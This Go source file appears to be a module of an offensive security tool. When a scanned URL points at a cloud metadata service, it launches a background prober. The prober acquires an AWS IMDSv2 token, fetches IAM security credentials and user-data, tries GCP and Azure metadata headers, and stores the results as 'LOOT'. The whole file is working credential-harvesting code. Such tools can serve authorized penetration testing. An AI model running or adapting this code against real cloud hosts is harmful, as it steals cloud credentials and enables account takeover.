package logic

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/pterm/pterm"
)

// TriggerCloudPivot checks if the URL target is a known Cloud Metadata service.
// It supports both the standard Magic IP and a local mock for testing.
func TriggerCloudPivot(url string) {
	if strings.Contains(url, "169.254.169.254") || strings.Contains(url, "127.0.0.1:8080") {
		pterm.Info.WithPrefix(pterm.Prefix{Text: "PIVOT", Style: pterm.NewStyle(pterm.FgBlack, pterm.BgYellow)}).
			Printfln("Cloud Infrastructure detected at %s. Spawning background prober...", url)
		
		go probeCloudMetadata(url)
	}
}

func probeCloudMetadata(url string) {
	// Clean the base URL to ensure endpoints are constructed correctly.
	// This prevents path doubling like /latest/meta-data//latest/api/token.
	baseURL := url
	if strings.Contains(url, "/latest") {
		baseURL = strings.Split(url, "/latest")[0]
	}
	baseURL = strings.TrimSuffix(baseURL, "/")

	// 1. Attempt AWS IMDSv2 Token acquisition
	tokenURL := baseURL + "/latest/api/token"
	client := &http.Client{Timeout: 5 * time.Second}
	
	req, _ := http.NewRequest("PUT", tokenURL, nil)
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		tokenBytes, _ := io.ReadAll(resp.Body)
		token := string(tokenBytes)
		pterm.Success.WithPrefix(pterm.Prefix{Text: "PIVOT", Style: pterm.NewStyle(pterm.FgBlack, pterm.BgGreen)}).
			Println("IMDSv2 Token Acquired. Harvesting Credentials...")
		
		harvestAWS(baseURL, token)
		return
	}

	// 2. Fallback to IMDSv1 or Generic Metadata Crawl
	pterm.Warning.WithPrefix(pterm.Prefix{Text: "PIVOT"}).Println("IMDSv2 failed or not required. Trying fallback...")
	harvestGeneric(url)
}

// harvestAWS iterates through sensitive metadata paths using the acquired token.
func harvestAWS(baseURL string, token string) {
	paths := []string{
		"/latest/meta-data/iam/security-credentials/",
		"/latest/user-data",
	}

	client := &http.Client{Timeout: 5 * time.Second}
	for _, p := range paths {
		fullURL := baseURL + p
		req, _ := http.NewRequest("GET", fullURL, nil)
		if token != "" {
			req.Header.Set("X-aws-ec2-metadata-token", token)
		}
		
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			// Store the finding in the Discovery Vault.
			Vault = append(Vault, Finding{
				Type:   "CLOUD_CRED",
				Value:  fmt.Sprintf("AWS_DATA: %s", string(body)),
				Source: fullURL,
			})
			pterm.Success.WithPrefix(pterm.Prefix{Text: "LOOT"}).Printfln("Recovered: %s", p)
		}
	}
}

// harvestGeneric handles non-token based metadata (IMDSv1 / GCP / Azure).
func harvestGeneric(url string) {
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("GET", url, nil)
	
	// Add common metadata headers for GCP and Azure.
	req.Header.Set("Metadata-Flavor", "Google")
	req.Header.Set("Metadata", "true")

	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		Vault = append(Vault, Finding{
			Type:   "METADATA_LEAK",
			Value:  string(body),
			Source: url,
		})
	}
}